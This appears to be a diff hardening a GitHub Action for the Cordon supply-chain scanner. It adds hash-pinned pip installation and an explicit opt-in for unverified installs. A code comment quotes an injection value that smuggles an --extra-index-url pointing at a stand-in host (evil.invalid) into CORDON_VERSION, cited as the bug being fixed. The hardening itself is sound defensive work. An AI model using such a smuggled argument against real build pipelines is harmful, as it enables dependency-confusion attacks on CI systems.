@@ -9,6 +9,14 @@ branding:
   color: blue
 
 inputs:
+  allow-unverified-install:
+    description: >
+      Install without checking the artefact against the hash pin shipped with
+      this Action. Only for running a ref that predates a signed release; it
+      leaves the scanner itself unverified, which is the one dependency a
+      supply-chain scanner cannot afford to take on trust.
+    required: false
+    default: "false"
   target:
     description: "Path or archive to scan."
     required: false
@@ -99,9 +107,47 @@ runs:
         # CORDON_VERSION to `0.1.0" --extra-index-url "https://evil.invalid/simple`
         # broke out of the quotes and handed arbitrary arguments to pip -- a
         # dependency-confusion primitive against the security scanner itself.
-        CORDON_VERSION: ${{ env.CORDON_VERSION || '0.1.0' }}
+        CORDON_VERSION: ${{ env.CORDON_VERSION || '' }}
+        ALLOW_UNVERIFIED: ${{ inputs.allow-unverified-install }}
+        ACTION_PATH: ${{ github.action_path }}
       run: |
         set -euo pipefail
+
+        # The pin is generated at release time from the artefacts actually
+        # published, and committed in the same commit the release tag points
+        # at. Pinning this Action to a commit SHA therefore pins what pip
+        # downloads as well -- which the SHA alone does not do, because it
+        # covers action.yml and not the index.
+        PIN="${ACTION_PATH}/requirements.txt"
+
+        if [ -f "$PIN" ]; then
+          if [ -n "$CORDON_VERSION" ] && ! grep -q "^cordon-scanner==${CORDON_VERSION} " "$PIN"; then
+            echo "::error::CORDON_VERSION is ${CORDON_VERSION}, but this ref pins a different version."
+            echo "The hash pin and the requested version have to agree, or the pin verifies nothing."
+            echo "Point uses: at the tag for ${CORDON_VERSION}, or unset CORDON_VERSION."
+            exit 1
+          fi
+          # --require-hashes makes pip refuse any artefact whose digest is not
+          # listed, including a transitive one. --no-deps is safe and honest
+          # here: the package declares no runtime dependencies, so there is
+          # nothing else to resolve, and asking pip to resolve nothing keeps
+          # the pin exhaustive.
+          python -m pip install --disable-pip-version-check --quiet \
+            --require-hashes --no-deps -r "$PIN"
+          exit 0
+        fi
+
+        # No pin on this ref. Refused rather than installed unverified: the
+        # scanner is the one dependency a supply-chain scan cannot take on
+        # trust, and an unverified install of it is the whole attack.
+        if [ "$ALLOW_UNVERIFIED" != "true" ]; then
+          echo "::error::This ref of the Action carries no hash pin, so the download cannot be verified."
+          echo "Point uses: at a release tag, which ships one."
+          echo "To proceed anyway, set allow-unverified-install: true and accept an unverified scanner."
+          exit 1
+        fi
+
+        echo "::warning::Installing Cordon without verifying it. The scanner itself is unchecked."
         # Refuse anything that is not a version. The environment indirection
         # above removes the shell-quoting break; this removes the pip-argument
         # injection that survives it.
